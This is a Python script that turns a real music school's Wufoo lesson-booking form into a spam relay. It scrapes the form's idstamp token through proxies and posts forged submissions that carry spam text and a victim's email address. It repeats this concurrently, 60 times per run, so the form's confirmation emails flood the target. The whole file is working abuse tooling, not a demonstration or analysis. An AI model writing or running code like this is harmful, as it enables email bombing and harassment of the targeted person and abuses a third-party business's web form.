import re
from os.path import basename

import requests

import module
from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'wonderpaws.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get(
        'https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/',
        headers=headers
    )
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'kaffessamusic.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary2fnzL8J6hp5q9WB7',
        'origin': 'https://kaffessamusic.wufoo.com',
        'referer': 'https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field1"\r\n\r\ntest https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field2"\r\n\r\ntest https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field221"\r\n\r\nBirstwith C of E Primary School\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field325"\r\n\r\n3\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field218"\r\n\r\ntest https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field219"\r\n\r\ntest https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field11"\r\n\r\n1231231234\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field10"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field118"\r\n\r\nBass guitar\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field14"\r\n\r\nPaired 20 Minute (£8 per lesson)\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="Field216"\r\n\r\ntest https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nsX3qgcV00s10RRKwi3z9OcqDxvBRnNMCGarPCQNezd4=\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":1,"startTime":92678,"endTime":115171,"referer":"https://kaffessamusic.wufoo.com/forms/m1pa8ncn11l0ht8/"}\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundary2fnzL8J6hp5q9WB7--\r\n'

    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)

    response = session.post(
        headers['referer'],
        headers=headers,
        data=data.encode(),
    )
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'thank you')
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
